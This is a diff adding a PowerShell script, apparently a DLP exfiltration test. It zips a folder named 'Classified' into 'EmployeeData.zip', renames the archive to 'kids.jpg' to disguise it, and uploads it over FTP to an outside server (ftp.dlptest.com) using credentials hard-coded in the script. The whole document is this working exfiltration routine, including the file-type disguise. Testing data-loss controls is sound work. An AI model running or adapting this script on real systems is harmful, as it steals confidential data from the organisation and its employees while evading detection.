@@ -1,0 +1,28 @@
+$source = "C:\Users\xyz\Downloads\src\Classified"
+
+$destination = "C:\Users\xyz\Downloads\src\EmployeeData.zip"
+$sendfile = "C:\Users\xyz\Downloads\src\kids.jpg"
+ If(Test-path $destination) {Remove-item $destination}
+ If(Test-path $sendfile) {Remove-item $sendfile}
+Add-Type -assembly "system.io.compression.filesystem"
+[io.compression.zipfile]::CreateFromDirectory($Source, $destination) 
+
+Rename-Item C:\Users\xyz\Downloads\src\EmployeeData.zip $sendfile
+
+#Directory where to find pictures to upload
+$Dir= 'C:\Users\xyz\Downloads\src\'
+#ftp server params
+$ftp = 'ftp://ftp.dlptest.com/'
+$user = 'dlpuser@dlptest.com'
+$pass = 'fwRhzAnR1vgig8s'
+
+$webclient = New-Object System.Net.WebClient 
+
+$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
+
+#list every jpg file 
+foreach($item in (dir $Dir "*.jpg")){ 
+    "Uploading $item..." 
+    $uri = New-Object System.Uri($ftp+$item.Name) 
+    $webclient.UploadFile($uri, $item.FullName) 
+ } 
